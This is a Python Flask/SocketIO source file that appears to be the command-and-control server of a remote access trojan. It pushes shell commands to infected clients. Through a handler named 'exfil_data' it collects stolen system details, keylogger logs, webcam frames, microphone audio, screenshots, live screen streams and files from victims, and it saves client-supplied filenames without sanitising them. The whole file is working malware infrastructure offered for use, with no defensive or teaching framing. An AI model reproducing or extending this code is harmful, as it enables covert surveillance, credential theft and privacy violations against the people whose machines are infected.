# Standard Library Imports
import os
import json
import time
from datetime import datetime
import base64


# Third-Party Imports
from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_socketio import SocketIO, emit
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Initialize Flask app and SocketIO
app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', os.urandom(24).hex())  # Fallback to random key if not set
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['DOWNLOAD_FOLDER'] = 'downloads'
socketio = SocketIO(app)

# Load authentication credentials from environment variables
AUTH_USERNAME = os.getenv('AUTH_USERNAME')
AUTH_PASSWORD = os.getenv('AUTH_PASSWORD')

if not AUTH_USERNAME or not AUTH_PASSWORD:
    raise ValueError("AUTH_USERNAME and AUTH_PASSWORD must be set in .env file")

# Global dictionaries to store client data
client_info = {}
client_activity = {}

# --- Routes ---
@app.route('/')
def index():
    """Render the main dashboard if the user is logged in, otherwise redirect to login."""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Handle user login with username and password from environment variables."""
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == AUTH_USERNAME and password == AUTH_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return render_template('login.html', error='Invalid credentials')
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Log out the user by clearing the session and redirect to login."""
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/send_command', methods=['POST'])
def send_command():
    """Send a command to a specific client if the user is authenticated."""
    if not session.get('logged_in'):
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 403

    client_id = request.form.get('client_id')
    command = request.form.get('command')

    if client_id and command:
        socketio.emit('command', command, to=client_id)
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

@app.route('/upload', methods=['POST'])
def upload_file():
    """Handle file uploads and notify clients if the user is authenticated."""
    if not session.get('logged_in'):
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 403

    if 'file' not in request.files:
        return jsonify({'status': 'error', 'message': 'No file part'}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({'status': 'error', 'message': 'No selected file'}), 400

    if file:
        filename = file.filename
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        socketio.emit('command', f'upload {filename}', broadcast=True)
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error', 'message': 'Upload failed'}), 400

# --- SocketIO Event Handlers ---
@socketio.on('connect')
def handle_connect():
    """Handle new client connections, ensuring authentication."""
    print(f"[*] Client connected: {request.sid}")
    if not session.get('logged_in'):
        emit('redirect', {'url': url_for('login')})
        disconnect()

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnections and update client info."""
    print(f"[*] Client disconnected: {request.sid}")
    if request.sid in client_info:
        del client_info[request.sid]
    if request.sid in client_activity:
        del client_activity[request.sid]
    client_info_list = [
        {
            'id': cid,
            'system': info,
            'activity': client_activity.get(cid, {'status': 'idle'})
        }
        for cid, info in client_info.items()
    ]
    emit('client_info', client_info_list, broadcast=True)

@socketio.on('command')
def handle_command(data):
    """Forward commands to specific clients if the user is authenticated."""
    if not session.get('logged_in'):
        return

    client_id = request.sid
    command = data.get('to', data)

    if isinstance(command, dict):
        target_client = command.get('to')
        if target_client:
            socketio.emit('command', command.get('command', ''), to=target_client)
    else:
        socketio.emit('command', command, to=client_id)

@socketio.on('exfil_data')
def handle_exfil_data(data):
    """Handle exfiltrated data from clients and broadcast to the dashboard."""
    client_id = request.sid
    data = json.loads(data)
    data_type = data.get('type')

    # Update client activity status
    client_activity[client_id]["last_active"] = time.time()
    current_time = time.time()
    for cid, activity in client_activity.items():
        activity["status"] = "idle" if current_time - activity["last_active"] > 30 else "active"

    # Process different types of exfiltrated data
    if data_type == "system_info":
        username = data.get('system', {}).get('username')
        if not username:
            socketio.emit('command', 'whoami', to=client_id)
        else:
            client_info[client_id] = {
                "system": data.get('system', {}),
                "hardware": data.get('hardware', {}),
                "network": data.get('network', {}),
                "user": data.get('user', {}),
                "software": data.get('software', {}),
                "environment": data.get('environment', {}),
                "peripherals": data.get('peripherals', {}),
                "security": data.get('security', {})
            }
            client_info[client_id]['username'] = username
            client_info[client_id]['ip_addresses'] = data.get('network', {}).get('ip_addresses', [])
            client_info[client_id]['location'] = data.get('network', {}).get('location', 'Unknown')

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{client_id}_{timestamp}_sysinfo.json"
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4)
            print(f"[*] Exfiltrated data saved: {filepath}")

    elif data_type == "command_output":
        command = data.get('command', 'unknown')
        output = data.get('output', '')
        current_dir = data.get('current_dir', 'unknown')

        if command.strip().lower() == 'whoami':
            username = output.strip()
            if client_id not in client_info:
                client_info[client_id] = {}
            client_info[client_id]['username'] = username

        emit('command_output', {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'client_id': client_id,
            'command': command,
            'output': output,
            'current_dir': current_dir
        }, broadcast=True)

    elif data_type == "network_data":
        emit('network_data', {
            'client_id': client_id,
            'timestamp': data.get('timestamp'),
            'bytes_sent': data.get('bytes_sent'),
            'bytes_recv': data.get('bytes_recv'),
            'sent_speed_mbps': data.get('sent_speed_mbps'),
            'recv_speed_mbps': data.get('recv_speed_mbps')
        }, broadcast=True)

    elif data_type == "system_data":
        emit('system_data', {
            'client_id': client_id,
            'timestamp': data.get('timestamp'),
            'cpu_usage_percent': data.get('cpu_usage_percent'),
            'memory_usage_mb': data.get('memory_usage_mb')
        }, broadcast=True)

    elif data_type == "webcam_data":
        emit('webcam_data', {
            'client_id': client_id,
            'image': data.get('image')
        }, broadcast=True)

    elif data_type == "mic_data":
        emit('mic_data', {
            'client_id': client_id,
            'audio': data.get('audio')
        }, broadcast=True)

    elif data_type == "screenshot_data":
        emit('screenshot_data', {
            'client_id': client_id,
            'image': data.get('image')
        }, broadcast=True)

    elif data_type == "screen_stream":
        emit('screen_stream', {
            'client_id': client_id,
            'image': data.get('image')
        }, broadcast=True)

    elif data_type == "keylog_data":
        emit('keylog_data', {
            'client_id': client_id,
            'logs': data.get('logs')
        }, broadcast=True)

    elif data_type == "file_download":
        filename = data.get('filename')
        file_data = base64.b64decode(data.get('data'))
        filepath = os.path.join(app.config['DOWNLOAD_FOLDER'], filename)
        with open(filepath, 'wb') as f:
            f.write(file_data)
        print(f"[*] Received file {filename} from client {client_id}")

    # Update client info list and broadcast to all connected clients
    client_info_list = [
        {
            'id': cid,
            'system': info,
            'activity': client_activity.get(cid, {'status': 'idle'})
        }
        for cid, info in client_info.items()
    ]
    emit('client_info', client_info_list, broadcast=True)

# --- Main Entry Point ---
if __name__ == '__main__':
    # Ensure upload and download directories exist
    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
    os.makedirs(app.config['DOWNLOAD_FOLDER'], exist_ok=True)
    # Run the server
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
    # Note: allow_unsafe_werkzeug=True is used for development purposes only.
    # In production, consider using a proper WSGI server like Gunicorn or uWSGI.